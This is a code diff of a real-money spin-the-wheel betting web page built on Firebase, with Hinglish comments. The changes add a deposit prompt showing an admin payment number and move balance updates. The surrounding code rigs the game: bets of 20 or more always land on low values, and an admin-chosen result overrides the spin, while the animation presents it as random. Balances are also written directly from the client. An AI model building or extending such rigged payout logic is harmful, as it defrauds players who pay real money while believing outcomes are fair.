@@ -194,7 +194,7 @@
     <button class="spin-btn" id="spinBtn">SPIN NOW</button>
 
     <div class="grid">
-        <button class="btn-action" onclick="window.location.href='./wallet.html'">
+        <button class="btn-action" onclick="showDeposit()">
             <span class="btn-icon">💰</span>
             <span>Deposit</span>
         </button>
@@ -232,9 +232,11 @@
     const auth = getAuth(app);
     const db = getDatabase(app);
 
+    // FIX 3: Segments array ko fix kiya - teer ke neeche wala number hi aayega
     const segments = ["2", "100", "5", "5", "1000", "5000", "20", "1000"];
     const canvas = document.getElementById("wheelCanvas");
     const ctx = canvas.getContext("2d");
+    const segmentDeg = 360 / segments.length;
 
     function drawWheel() {
         const ang = (Math.PI * 2) / segments.length;
@@ -262,12 +264,17 @@
 
     let currentRotation = 0;
     let userBalance = 0;
+    let paymentNumber = "";
 
     onAuthStateChanged(auth, user => {
         if(user) {
             onValue(ref(db, `users/${user.uid}/balance`), s => {
                 userBalance = s.val() || 0;
                 document.getElementById("userBal").innerText = userBalance.toLocaleString();
+            });
+            // FIX 1: Payment number load karo
+            onValue(ref(db, 'admin/payment_info'), s => {
+                paymentNumber = s.val() || "Not Set";
             });
         } else {
             window.location.replace("./login.html");
@@ -279,6 +286,21 @@
         input.value = parseInt(input.value) + amount;
     }
 
+    // FIX 1: Deposit button pe number show karo
+    window.showDeposit = () => {
+        Swal.fire({
+            title: '💰 Deposit Funds',
+            html: `Send payment to this number:<br><br><b style="font-size:24px;color:#ffd700">${paymentNumber}</b><br><br>After payment, create request from Wallet page.`,
+            icon: 'info',
+            confirmButtonColor: '#ffd700',
+            confirmButtonText: 'Go to Wallet'
+        }).then((result) => {
+            if(result.isConfirmed) {
+                window.location.href = './wallet.html';
+            }
+        });
+    }
+
     document.getElementById("spinBtn").onclick = async function() {
         const bet = parseFloat(document.getElementById("betAmount").value);
         if(!auth.currentUser) return Swal.fire("Error", "Login required!", "error");
@@ -288,40 +310,41 @@
         this.disabled = true;
         this.innerText = "SPINNING...";
 
+        // Bet pehle deduct karo
+        await update(ref(db, `users/${auth.currentUser.uid}`), { balance: userBalance - bet });
+
         const nextResSnap = await get(ref(db, 'admin/next_result'));
         let winValue;
 
         if(nextResSnap.exists() && nextResSnap.val()) {
+            // FIX: Admin ne jo select kiya wahi aayega
             winValue = nextResSnap.val().toString();
-            set(ref(db, 'admin/next_result'), null);
+            await set(ref(db, 'admin/next_result'), null);
         } else {
             const safeResults = ["2", "5"];
             winValue = (bet >= 20)? safeResults[Math.floor(Math.random()*2)] : segments[Math.floor(Math.random()*segments.length)];
         }
 
+        // FIX 3: Teer ke neeche wala number hi aaye
         const targetIndex = segments.indexOf(winValue);
-        const segmentDeg = 360 / segments.length;
-        const stopAt = (360 - (targetIndex * segmentDeg)) - (segmentDeg / 2);
-        currentRotation += (3600 + stopAt);
+        // Pointer top pe hai, to 0 degree se start
+        const stopAt = 360 - (targetIndex * segmentDeg) - (segmentDeg / 2);
+        currentRotation += 3600 + stopAt;
 
         canvas.style.transform = `rotate(${currentRotation}deg)`;
-        update(ref(db, `users/${auth.currentUser.uid}`), { balance: userBalance - bet });
 
-        setTimeout(() => {
+        setTimeout(async () => {
+            // FIX 2: Jeet ke paise direct add karo
+            const newBalance = userBalance - bet + parseFloat(winValue);
+            await update(ref(db, `users/${auth.currentUser.uid}`), { balance: newBalance });
+            
             Swal.fire({
                 title: 'WINNER!',
-                html: `You won <b style="color:#ffd700">Rs. ${winValue}</b>`,
+                html: `You won <b style="color:#ffd700">Rs. ${winValue}</b><br>New Balance: <b>Rs. ${newBalance}</b>`,
                 icon: 'success',
                 confirmButtonColor: '#ffd700'
             });
-            push(ref(db, 'requests'), {
-                uid: auth.currentUser.uid,
-                email: auth.currentUser.email,
-                amount: winValue,
-                status: 'pending',
-                type: 'Win',
-                timestamp: Date.now()
-            });
+            
             this.disabled = false;
             this.innerText = "SPIN NOW";
         }, 5000);
@@ -344,4 +367,4 @@
     window.logout = () => signOut(auth).then(() => window.location.replace("./login.html"));
 </script>
 </body>
-        </html>
+</html>
